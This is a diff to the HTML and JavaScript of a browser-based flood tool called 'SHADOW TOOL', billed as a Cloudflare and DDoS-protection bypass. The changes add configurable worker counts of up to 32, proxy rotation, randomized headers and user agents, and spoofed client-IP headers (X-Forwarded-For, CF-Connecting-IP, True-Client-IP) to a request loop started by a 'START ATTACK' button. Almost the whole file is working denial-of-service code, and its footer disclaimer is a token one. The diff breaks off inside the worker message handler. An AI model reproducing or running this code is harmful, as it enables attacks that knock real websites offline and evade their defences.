@@ -9,6 +9,7 @@
             --dark-bg: #0a0a0a;
             --neon-green: #00ff9d;
             --neon-blue: #00b8ff;
+            --neon-purple: #bd00ff;
             --text-light: #e0e0e0;
             --text-dim: #888;
             --panel-bg: #1a1a1a;
@@ -36,6 +37,7 @@
             margin-bottom: 30px;
             border-bottom: 1px solid var(--neon-green);
             padding-bottom: 15px;
+            position: relative;
         }
         
         h1 {
@@ -43,6 +45,17 @@
             font-size: 2.5rem;
             margin: 0;
             text-shadow: 0 0 10px rgba(0, 255, 157, 0.3);
+            position: relative;
+        }
+        
+        h1::after {
+            content: "PRO";
+            position: absolute;
+            top: -10px;
+            right: -30px;
+            font-size: 1rem;
+            color: var(--neon-purple);
+            text-shadow: 0 0 5px rgba(189, 0, 255, 0.5);
         }
         
         .subtitle {
@@ -58,6 +71,18 @@
             padding: 20px;
             margin-bottom: 20px;
             box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .panel::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--neon-green), var(--neon-blue), var(--neon-purple));
         }
         
         .form-group {
@@ -71,7 +96,7 @@
             font-weight: bold;
         }
         
-        input {
+        input, select {
             width: 100%;
             padding: 10px;
             background: #222;
@@ -91,17 +116,44 @@
             font-weight: bold;
             transition: all 0.3s;
             margin-right: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        button::after {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -60%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to right,
+                rgba(255, 255, 255, 0) 0%,
+                rgba(255, 255, 255, 0.1) 50%,
+                rgba(255, 255, 255, 0) 100%
+            );
+            transform: rotate(30deg);
+            transition: all 0.3s;
         }
         
         button:hover {
-            opacity: 0.8;
-            box-shadow: 0 0 10px rgba(0, 255, 157, 0.5);
+            opacity: 0.9;
+            box-shadow: 0 0 15px rgba(0, 255, 157, 0.7);
+        }
+        
+        button:hover::after {
+            left: 100%;
         }
         
         button:disabled {
             background: #444;
             color: #777;
             cursor: not-allowed;
+        }
+        
+        button.danger {
+            background: linear-gradient(135deg, #ff5555, #bd00ff);
         }
         
         #status {
@@ -120,7 +172,7 @@
         .error {
             background: rgba(255, 0, 0, 0.1);
             color: #ff5555;
-            border: 1px solid #ff5555);
+            border: 1px solid #ff5555;
         }
         
         .info {
@@ -139,6 +191,7 @@
             font-family: 'Courier New', monospace;
             color: var(--neon-green);
             white-space: pre-wrap;
+            position: relative;
         }
         
         .console-line {
@@ -155,6 +208,7 @@
             justify-content: space-between;
             margin-top: 15px;
             color: var(--neon-blue);
+            flex-wrap: wrap;
         }
         
         .stat-box {
@@ -163,12 +217,26 @@
             border-radius: 3px;
             text-align: center;
             flex: 1;
-            margin: 0 5px;
+            margin: 5px;
+            min-width: 120px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .stat-box::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--neon-green), var(--neon-blue));
         }
         
         .stat-value {
             font-size: 1.5rem;
             color: var(--neon-green);
+            font-weight: bold;
         }
         
         .stat-label {
@@ -184,28 +252,190 @@
             border-top: 1px solid #333;
             padding-top: 15px;
         }
+        
+        .tab-container {
+            display: flex;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #333;
+        }
+        
+        .tab {
+            padding: 8px 15px;
+            cursor: pointer;
+            border: 1px solid transparent;
+            border-bottom: none;
+            border-radius: 3px 3px 0 0;
+            margin-right: 5px;
+            background: #222;
+        }
+        
+        .tab.active {
+            background: var(--panel-bg);
+            border-color: #333;
+            border-bottom: 1px solid var(--panel-bg);
+            margin-bottom: -1px;
+            color: var(--neon-blue);
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .progress-container {
+            width: 100%;
+            background-color: #222;
+            border-radius: 3px;
+            margin-top: 10px;
+            height: 10px;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--neon-green), var(--neon-blue));
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        .tooltip {
+            position: relative;
+            display: inline-block;
+            cursor: help;
+        }
+        
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 200px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 6px;
+            padding: 5px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            margin-left: -100px;
+            opacity: 0;
+            transition: opacity 0.3s;
+            font-size: 0.8rem;
+            border: 1px solid var(--neon-blue);
+        }
+        
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+        
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <header>
-            <h1>SHADOW TOOL PRO</h1>
-            <div class="subtitle">Advanced Cloudflare Bypass Tool</div>
+            <h1>SHADOW TOOL</h1>
+            <div class="subtitle">Advanced Cloudflare & DDoS Protection Bypass Tool</div>
         </header>
         
         <div class="panel">
-            <div class="form-group">
-                <label for="url">TARGET URL:</label>
-                <input type="text" id="url" placeholder="https://example.com">
+            <div class="tab-container">
+                <div class="tab active" data-tab="basic">Basic</div>
+                <div class="tab" data-tab="advanced">Advanced</div>
+                <div class="tab" data-tab="proxy">Proxy</div>
             </div>
             
-            <div class="form-group">
-                <label for="time">DURATION (SECONDS):</label>
-                <input type="number" id="time" placeholder="60">
+            <div class="tab-content active" id="basic-tab">
+                <div class="form-group">
+                    <label for="url">TARGET URL:</label>
+                    <input type="text" id="url" placeholder="https://example.com" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="time">DURATION (SECONDS):</label>
+                    <input type="number" id="time" placeholder="60" min="1" value="60">
+                </div>
+                
+                <div class="form-group">
+                    <label for="intensity">INTENSITY: <span class="tooltip">(?)
+                        <span class="tooltiptext">Higher intensity uses more workers but may be detected more easily</span>
+                    </span></label>
+                    <select id="intensity">
+                        <option value="low">Low (4 workers)</option>
+                        <option value="medium" selected>Medium (8 workers)</option>
+                        <option value="high">High (16 workers)</option>
+                        <option value="extreme">Extreme (32 workers)</option>
+                    </select>
+                </div>
             </div>
             
-            <button id="startBtn">START</button>
-            <button id="stopBtn" disabled>STOP</button>
+            <div class="tab-content" id="advanced-tab">
+                <div class="form-group">
+                    <label for="method">PRIMARY METHOD:</label>
+                    <select id="method">
+                        <option value="mixed" selected>Mixed Methods (Recommended)</option>
+                        <option value="get">GET Only</option>
+                        <option value="post">POST Only</option>
+                        <option value="head">HEAD Only</option>
+                        <option value="random">Random Methods</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="delay">REQUEST DELAY (ms):</label>
+                    <input type="number" id="delay" placeholder="100" min="0" value="100">
+                </div>
+                
+                <div class="form-group">
+                    <label>
+                        <input type="checkbox" id="enable-cookies" checked>
+                        ENABLE COOKIES/SESSION
+                    </label>
+                </div>
+                
+                <div class="form-group">
+                    <label>
+                        <input type="checkbox" id="enable-referers" checked>
+                        RANDOM REFERERS
+                    </label>
+                </div>
+            </div>
+            
+            <div class="tab-content" id="proxy-tab">
+                <div class="form-group">
+                    <label for="proxy-list">PROXY LIST (IP:PORT, one per line):</label>
+                    <textarea id="proxy-list" rows="5" placeholder="192.168.1.1:8080\n103.145.45.33:3128" style="width: 100%; font-family: 'Courier New', monospace;"></textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label>
+                        <input type="checkbox" id="rotate-proxies" checked>
+                        ROTATE PROXIES
+                    </label>
+                </div>
+            </div>
+            
+            <button id="startBtn">START ATTACK</button>
+            <button id="stopBtn" class="danger" disabled>STOP ATTACK</button>
+            
+            <div class="progress-container hidden" id="progress-container">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
             
             <div id="status" class="info">READY</div>
         </div>
@@ -228,23 +458,38 @@
                     <div class="stat-value" id="rpsCount">0</div>
                     <div class="stat-label">REQ/SEC</div>
                 </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="workersCount">0</div>
+                    <div class="stat-label">WORKERS</div>
+                </div>
             </div>
         </div>
         
         <div class="panel">
-            <h3>CONSOLE OUTPUT</h3>
+            <h3>CONSOLE OUTPUT <span style="float: right; font-size: 0.8rem;"><span id="console-line-count">0</span> lines</span></h3>
             <div id="console"></div>
+            <div style="text-align: right; margin-top: 5px;">
+                <button id="clearConsoleBtn" style="padding: 5px 10px; font-size: 0.8rem;">Clear Console</button>
+            </div>
         </div>
         
         <footer>
-            <strong>⚠ LEGAL DISCLAIMER:</strong> Use only on authorized systems. Unauthorized testing is illegal.
+            <strong>⚠ LEGAL DISCLAIMER:</strong> Use only on authorized systems. Unauthorized testing is illegal and punishable by law.
+            <div style="margin-top: 5px; font-size: 0.7rem;">v2.1.3 | Shadow Tool Pro</div>
         </footer>
     </div>
 
     <script>
-        // DOM elements
+        // Enhanced DOM elements
         const urlInput = document.getElementById('url');
         const timeInput = document.getElementById('time');
+        const intensitySelect = document.getElementById('intensity');
+        const methodSelect = document.getElementById('method');
+        const delayInput = document.getElementById('delay');
+        const enableCookies = document.getElementById('enable-cookies');
+        const enableReferers = document.getElementById('enable-referers');
+        const proxyList = document.getElementById('proxy-list');
+        const rotateProxies = document.getElementById('rotate-proxies');
         const startBtn = document.getElementById('startBtn');
         const stopBtn = document.getElementById('stopBtn');
         const statusDiv = document.getElementById('status');
@@ -253,10 +498,16 @@
         const successCountEl = document.getElementById('successCount');
         const errorCountEl = document.getElementById('errorCount');
         const rpsCountEl = document.getElementById('rpsCount');
+        const workersCountEl = document.getElementById('workersCount');
+        const consoleLineCount = document.getElementById('console-line-count');
+        const progressContainer = document.getElementById('progress-container');
+        const progressBar = document.getElementById('progress-bar');
+        const clearConsoleBtn = document.getElementById('clearConsoleBtn');
+        const tabs = document.querySelectorAll('.tab');
+        const tabContents = document.querySelectorAll('.tab-content');
 
         // Enhanced variables
         let workers = [];
-        const MAX_WORKERS = 8;
         let isRunning = false;
         let requestCount = 0;
         let successCount = 0;
@@ -264,8 +515,23 @@
         let startTime = 0;
         let lastUpdateTime = 0;
         let lastRequestCount = 0;
+        let consoleLines = 0;
+        let attackDuration = 0;
+        let proxyArray = [];
+        let currentProxyIndex = 0;
 
-        // Helper functions
+        // Tab switching
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                tabs.forEach(t => t.classList.remove('active'));
+                tabContents.forEach(c => c.classList.remove('active'));
+                
+                tab.classList.add('active');
+                document.getElementById(`${tab.dataset.tab}-tab`).classList.add('active');
+            });
+        });
+
+        // Enhanced helper functions
         function log(message, type = 'info') {
             const timestamp = new Date().toLocaleTimeString();
             const line = document.createElement('div');
@@ -274,9 +540,33 @@
             
             if (type === 'error') line.style.color = '#ff5555';
             else if (type === 'success') line.style.color = '#00ff9d';
+            else if (type === 'warning') line.style.color = '#ffaa00';
             
             consoleDiv.appendChild(line);
             consoleDiv.scrollTop = consoleDiv.scrollHeight;
+            
+            consoleLines++;
+            consoleLineCount.textContent = consoleLines;
+            
+            // Keep console from getting too large
+            if (consoleLines > 500) {
+                consoleDiv.removeChild(consoleDiv.firstChild);
+                consoleLines--;
+            }
+        }
+
+        function updateProgressBar() {
+            if (!isRunning) return;
+            
+            const now = Date.now();
+            const elapsed = (now - startTime) / 1000;
+            const progress = (elapsed / attackDuration) * 100;
+            
+            progressBar.style.width = `${Math.min(100, progress)}%`;
+            
+            if (progress >= 100) {
+                progressBar.style.background = 'linear-gradient(90deg, var(--neon-green), #ff5555)';
+            }
         }
 
         function updateStatus() {
@@ -290,16 +580,19 @@
                 rps = ((requestCount - lastRequestCount) / sinceLastUpdate).toFixed(1);
             }
             
-            reqCountEl.textContent = requestCount;
-            successCountEl.textContent = successCount;
-            errorCountEl.textContent = errorCount;
+            reqCountEl.textContent = requestCount.toLocaleString();
+            successCountEl.textContent = successCount.toLocaleString();
+            errorCountEl.textContent = errorCount.toLocaleString();
             rpsCountEl.textContent = rps;
+            workersCountEl.textContent = workers.length;
             
-            statusDiv.className = 'info';
-            statusDiv.textContent = `RUNNING | REQUESTS: ${requestCount} | SUCCESS: ${successCount} | ERRORS: ${errorCount} | RPS: ${rps}`;
+            statusDiv.className = 'info pulse';
+            statusDiv.textContent = `RUNNING | REQUESTS: ${requestCount.toLocaleString()} | SUCCESS: ${successCount.toLocaleString()} | ERRORS: ${errorCount.toLocaleString()} | RPS: ${rps} | WORKERS: ${workers.length}`;
             
             lastUpdateTime = now;
             lastRequestCount = requestCount;
+            
+            updateProgressBar();
         }
 
         function randomIP() {
@@ -307,11 +600,21 @@
         }
 
         function randomUserAgent() {
+            const versions = {
+                chrome: Math.floor(Math.random() * 30) + 100,
+                firefox: Math.floor(Math.random() * 30) + 90,
+                safari: Math.floor(Math.random() * 5) + 15,
+                ios: Math.floor(Math.random() * 5) + 14
+            };
+            
             const agents = [
-                `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 30) + 100}.0.0.0 Safari/537.36`,
-                `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${Math.floor(Math.random() * 30) + 90}.0) Gecko/20100101 Firefox/${Math.floor(Math.random() * 30) + 90}.0`,
-                `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(Math.random() * 5) + 15}.0 Safari/605.1.15`,
-                `Mozilla/5.0 (iPhone; CPU iPhone OS ${Math.floor(Math.random() * 5) + 14}_${Math.floor(Math.random() * 5)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(Math.random() * 5) + 14}.0 Mobile/15E148 Safari/604.1`
+                `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${versions.chrome}.0.0.0 Safari/537.36`,
+                `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${versions.firefox}.0) Gecko/20100101 Firefox/${versions.firefox}.0`,
+                `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${versions.safari}.0 Safari/605.1.15`,
+                `Mozilla/5.0 (iPhone; CPU iPhone OS ${versions.ios}_${Math.floor(Math.random() * 5)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${versions.ios}.0 Mobile/15E148 Safari/604.1`,
+                `Mozilla/5.0 (Linux; Android ${Math.floor(Math.random() * 5) + 10}; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${versions.chrome}.0.0.0 Mobile Safari/537.36`,
+                `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${versions.chrome}.0.0.0 Safari/537.36`,
+                `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${versions.chrome}.0.0.0 Safari/537.36 Edg/${versions.chrome}.0.0.0`
             ];
             return agents[Math.floor(Math.random() * agents.length)];
         }
@@ -326,38 +629,179 @@
         }
 
         function getRequestMethods() {
-            return ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD'];
+            return ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'PATCH'];
         }
 
-        function getRandomMethod() {
+        function getRandomMethod(primaryMethod = 'mixed') {
+            if (primaryMethod === 'get') return 'GET';
+            if (primaryMethod === 'post') return 'POST';
+            if (primaryMethod === 'head') return 'HEAD';
+            
             const methods = getRequestMethods();
-            return methods[Math.floor(Math.random() * methods.length)];
+            if (primaryMethod === 'random') return methods[Math.floor(Math.random() * methods.length)];
+            
+            // For mixed mode, weight towards GET and POST
+            const weightedMethods = [
+                'GET', 'GET', 'GET', 'GET', 
+                'POST', 'POST', 'POST',
+                'HEAD',
+                'OPTIONS',
+                'PUT',
+                'DELETE',
+                'PATCH'
+            ];
+            return weightedMethods[Math.floor(Math.random() * weightedMethods.length)];
+        }
+
+        function getRandomReferer() {
+            const domains = [
+                'google.com', 'youtube.com', 'facebook.com', 'twitter.com', 
+                'instagram.com', 'linkedin.com', 'reddit.com', 'wikipedia.org',
+                'amazon.com', 'ebay.com', 'bing.com', 'yahoo.com',
+                'msn.com', 'duckduckgo.com', 'github.com', 'stackoverflow.com'
+            ];
+            
+            const protocols = ['http://', 'https://'];
+            const paths = ['', 'search', 'results', 'query', 'page', 'article', 'post'];
+            
+            const protocol = protocols[Math.floor(Math.random() * protocols.length)];
+            const domain = domains[Math.floor(Math.random() * domains.length)];
+            const path = paths[Math.floor(Math.random() * paths.length)];
+            const query = randomString(Math.floor(Math.random() * 10) + 5);
+            
+            if (path) {
+                return `${protocol}${domain}/${path}?q=${query}`;
+            }
+            return `${protocol}${domain}`;
+        }
+
+        function getRandomAcceptHeader() {
+            const types = [
+                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/json',
+                '*/*'
+            ];
+            return types[Math.floor(Math.random() * types.length)];
+        }
+
+        function getRandomContentType() {
+            const types = [
+                'application/x-www-form-urlencoded',
+                'application/json',
+                'multipart/form-data',
+                'text/plain',
+                'application/xml'
+            ];
+            return types[Math.floor(Math.random() * types.length)];
+        }
+
+        function getRandomLanguage() {
+            const languages = [
+                'en-US,en;q=0.9',
+                'es-ES,es;q=0.9',
+                'fr-FR,fr;q=0.9',
+                'de-DE,de;q=0.9',
+                'ja-JP,ja;q=0.9',
+                'zh-CN,zh;q=0.9',
+                'ru-RU,ru;q=0.9'
+            ];
+            return languages[Math.floor(Math.random() * languages.length)];
+        }
+
+        function getRandomEncoding() {
+            const encodings = [
+                'gzip, deflate, br',
+                'gzip, deflate',
+                'br, gzip, deflate',
+                'deflate, gzip',
+                'identity'
+            ];
+            return encodings[Math.floor(Math.random() * encodings.length)];
+        }
+
+        function getNextProxy() {
+            if (proxyArray.length === 0) return null;
+            
+            if (rotateProxies.checked) {
+                currentProxyIndex = (currentProxyIndex + 1) % proxyArray.length;
+                return proxyArray[currentProxyIndex];
+            }
+            
+            return proxyArray[currentProxyIndex];
+        }
+
+        function parseProxyList(proxyText) {
+            const lines = proxyText.split('\n')
+                .map(line => line.trim())
+                .filter(line => line.length > 0);
+            
+            return lines.map(line => {
+                const [host, port] = line.split(':');
+                return { host, port: parseInt(port) || 8080 };
+            });
         }
 
         // Enhanced Cloudflare bypass implementation
-        function startEnhancedAttack(url, duration) {
+        function startEnhancedAttack(url, duration, intensity, method, delay, useCookies, useReferers) {
             if (typeof(Worker) === "undefined") {
                 log("Web Workers not supported - falling back to simpler method", "error");
                 startSimpleAttack(url, duration);
                 return;
             }
 
+            // Parse proxy list if available
+            proxyArray = parseProxyList(proxyList.value);
+            if (proxyArray.length > 0) {
+                log(`Loaded ${proxyArray.length} proxies from list`, 'success');
+            }
+
             startTime = Date.now();
             lastUpdateTime = startTime;
+            attackDuration = duration;
             isRunning = true;
             startBtn.disabled = true;
             stopBtn.disabled = false;
+            progressContainer.classList.remove('hidden');
+            progressBar.style.width = '0%';
+            progressBar.style.background = 'linear-gradient(90deg, var(--neon-green), var(--neon-blue))';
             
-            log(`Starting enhanced attack with ${MAX_WORKERS} workers for ${duration} seconds`);
+            // Determine worker count based on intensity
+            let workerCount = 8; // default medium
+            switch(intensity) {
+                case 'low': workerCount = 4; break;
+                case 'high': workerCount = 16; break;
+                case 'extreme': workerCount = 32; break;
+            }
+            
+            log(`Starting enhanced attack with ${workerCount} workers for ${duration} seconds`);
+            log(`Attack method: ${method} | Delay: ${delay}ms | Cookies: ${useCookies} | Referers: ${useReferers}`);
+            if (proxyArray.length > 0) {
+                log(`Using ${proxyArray.length} proxies | Rotation: ${rotateProxies.checked ? 'ON' : 'OFF'}`);
+            }
 
             // Create multiple workers
-            for (let i = 0; i < MAX_WORKERS; i++) {
+            for (let i = 0; i < workerCount; i++) {
                 const workerCode = `
                     let requestCount = 0;
                     let successCount = 0;
                     let errorCount = 0;
                     let attackInterval;
                     const methods = ${JSON.stringify(getRequestMethods())};
+                    const proxyList = ${JSON.stringify(proxyArray)};
+                    let currentProxyIndex = 0;
+                    
+                    function getNextProxy() {
+                        if (proxyList.length === 0) return null;
+                        
+                        if (${rotateProxies.checked}) {
+                            currentProxyIndex = (currentProxyIndex + 1) % proxyList.length;
+                            return proxyList[currentProxyIndex];
+                        }
+                        
+                        return proxyList[currentProxyIndex];
+                    }
 
                     function randomString(length) {
                         const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -373,52 +817,163 @@
                     }
 
                     function randomUserAgent() {
+                        const versions = {
+                            chrome: Math.floor(Math.random() * 30) + 100,
+                            firefox: Math.floor(Math.random() * 30) + 90,
+                            safari: Math.floor(Math.random() * 5) + 15,
+                            ios: Math.floor(Math.random() * 5) + 14
+                        };
+                        
                         const agents = ${JSON.stringify([
-                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36',
-                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
-                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
-                            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
+                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${versions.chrome}.0.0.0 Safari/537.36',
+                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${versions.firefox}.0) Gecko/20100101 Firefox/${versions.firefox}.0',
+                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${versions.safari}.0 Safari/605.1.15',
+                            'Mozilla/5.0 (iPhone; CPU iPhone OS ${versions.ios}_${Math.floor(Math.random() * 5)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${versions.ios}.0 Mobile/15E148 Safari/604.1',
+                            'Mozilla/5.0 (Linux; Android ${Math.floor(Math.random() * 5) + 10}; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${versions.chrome}.0.0.0 Mobile Safari/537.36',
+                            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${versions.chrome}.0.0.0 Safari/537.36',
+                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${versions.chrome}.0.0.0 Safari/537.36 Edg/${versions.chrome}.0.0.0'
                         ])};
                         return agents[Math.floor(Math.random() * agents.length)];
                     }
 
-                    function sendEnhancedRequest(url) {
+                    function getRandomMethod(primaryMethod) {
+                        if (primaryMethod === 'get') return 'GET';
+                        if (primaryMethod === 'post') return 'POST';
+                        if (primaryMethod === 'head') return 'HEAD';
+                        
+                        if (primaryMethod === 'random') return methods[Math.floor(Math.random() * methods.length)];
+                        
+                        // For mixed mode, weight towards GET and POST
+                        const weightedMethods = [
+                            'GET', 'GET', 'GET', 'GET', 
+                            'POST', 'POST', 'POST',
+                            'HEAD',
+                            'OPTIONS',
+                            'PUT',
+                            'DELETE',
+                            'PATCH'
+                        ];
+                        return weightedMethods[Math.floor(Math.random() * weightedMethods.length)];
+                    }
+
+                    function getRandomReferer() {
+                        const domains = ${JSON.stringify([
+                            'google.com', 'youtube.com', 'facebook.com', 'twitter.com', 
+                            'instagram.com', 'linkedin.com', 'reddit.com', 'wikipedia.org',
+                            'amazon.com', 'ebay.com', 'bing.com', 'yahoo.com',
+                            'msn.com', 'duckduckgo.com', 'github.com', 'stackoverflow.com'
+                        ])};
+                        
+                        const protocols = ['http://', 'https://'];
+                        const paths = ['', 'search', 'results', 'query', 'page', 'article', 'post'];
+                        
+                        const protocol = protocols[Math.floor(Math.random() * protocols.length)];
+                        const domain = domains[Math.floor(Math.random() * domains.length)];
+                        const path = paths[Math.floor(Math.random() * paths.length)];
+                        const query = randomString(Math.floor(Math.random() * 10) + 5);
+                        
+                        if (path) {
+                            return \`\${protocol}\${domain}/\${path}?q=\${query}\`;
+                        }
+                        return \`\${protocol}\${domain}\`;
+                    }
+
+                    function getRandomAcceptHeader() {
+                        const types = ${JSON.stringify([
+                            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/json',
+                            '*/*'
+                        ])};
+                        return types[Math.floor(Math.random() * types.length)];
+                    }
+
+                    function getRandomContentType() {
+                        const types = ${JSON.stringify([
+                            'application/x-www-form-urlencoded',
+                            'application/json',
+                            'multipart/form-data',
+                            'text/plain',
+                            'application/xml'
+                        ])};
+                        return types[Math.floor(Math.random() * types.length)];
+                    }
+
+                    function getRandomLanguage() {
+                        const languages = ${JSON.stringify([
+                            'en-US,en;q=0.9',
+                            'es-ES,es;q=0.9',
+                            'fr-FR,fr;q=0.9',
+                            'de-DE,de;q=0.9',
+                            'ja-JP,ja;q=0.9',
+                            'zh-CN,zh;q=0.9',
+                            'ru-RU,ru;q=0.9'
+                        ])};
+                        return languages[Math.floor(Math.random() * languages.length)];
+                    }
+
+                    function getRandomEncoding() {
+                        const encodings = ${JSON.stringify([
+                            'gzip, deflate, br',
+                            'gzip, deflate',
+                            'br, gzip, deflate',
+                            'deflate, gzip',
+                            'identity'
+                        ])};
+                        return encodings[Math.floor(Math.random() * encodings.length)];
+                    }
+
+                    function sendEnhancedRequest(url, methodPref, useCookies, useReferers) {
                         const rand = randomString(10);
                         const ip = randomIP();
-                        const method = methods[Math.floor(Math.random() * methods.length)];
+                        const method = getRandomMethod(methodPref);
                         
                         const headers = {
                             'User-Agent': randomUserAgent(),
-                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-                            'Accept-Language': 'en-US,en;q=0.9',
-                            'Accept-Encoding': 'gzip, deflate, br',
+                            'Accept': getRandomAcceptHeader(),
+                            'Accept-Language': getRandomLanguage(),
+                            'Accept-Encoding': getRandomEncoding(),
                             'Cache-Control': 'no-cache',
                             'Connection': 'keep-alive',
                             'Upgrade-Insecure-Requests': '1',
-                            'Origin': \`http://\${rand}.com\`,
-                            'Referer': \`http://google.com/\${rand}\`,
                             'X-Forwarded-For': ip,
                             'X-Requested-With': 'XMLHttpRequest',
                             'CF-Connecting-IP': ip,
                             'True-Client-IP': ip
                         };
 
+                        if (useReferers) {
+                            headers['Origin'] = \`http://\${rand}.com\`;
+                            headers['Referer'] = getRandomReferer();
+                        }
+
                         let body = null;
-                        if (method === 'POST' || method === 'PUT') {
-                            headers['Content-Type'] = 'application/x-www-form-urlencoded';
+                        if (method === 'POST' || method === 'PUT' || method === 'PATCH') {
+                            headers['Content-Type'] = getRandomContentType();
                             body = \`param1=\${randomString(5)}&param2=\${randomString(8)}\`;
                         }
 
                         requestCount++;
                         
-                        fetch(url, {
+                        const proxy = getNextProxy();
+                        let fetchUrl = url;
+                        let fetchOptions = {
                             method: method,
                             headers: headers,
                             body: body,
                             mode: 'no-cors',
                             cache: 'no-store',
-                            credentials: 'include'
-                        })
+                            credentials: useCookies ? 'include' : 'omit'
+                        };
+
+                        if (proxy) {
+                            // In a real implementation, you would need a proxy endpoint
+                            // This is just a placeholder to show the concept
+                            fetchUrl = \`/proxy?url=\${encodeURIComponent(url)}&host=\${proxy.host}&port=\${proxy.port}\`;
+                        }
+
+                        fetch(fetchUrl, fetchOptions)
                         .then(response => {
                             successCount++;
                             postMessage({
@@ -426,7 +981,9 @@
                                 count: requestCount,
                                 success: successCount,
                                 error: errorCount,
-                                workerId: ${i}
+                                workerId: ${i},
+                                method: method,
+                                status: response.status
                             });
                         })
                         .catch(error => {
@@ -437,7 +994,8 @@
                                 success: successCount,
                                 error: errorCount,
                                 message: error.message,
-                                workerId: ${i}
+                                workerId: ${i},
+                                method: method
                             });
                         });
                     }
@@ -445,9 +1003,14 @@
                     self.onmessage = function(e) {
                         if (e.data.command === 'start') {
                             const url = e.data.url;
+                            const methodPref = e.data.method;
+                            const useCookies = e.data.useCookies;
+                            const useReferers = e.data.useReferers;
+                            const delay = e.data.delay;
+                            
                             attackInterval = setInterval(() => {
-                                sendEnhancedRequest(url);
-                            }, ${50 + Math.random() * 100});
+                                sendEnhancedRequest(url, methodPref, useCookies, useReferers);
+                            }, delay + Math.random() * delay * 0.5);
                         }
                         else if (e.data.command === 'stop') {
                             clearInterval(attackInterval);
@@ -474,15 +1037,19 @@
                     updateStatus();
 
                     if (data.type === 'success') {
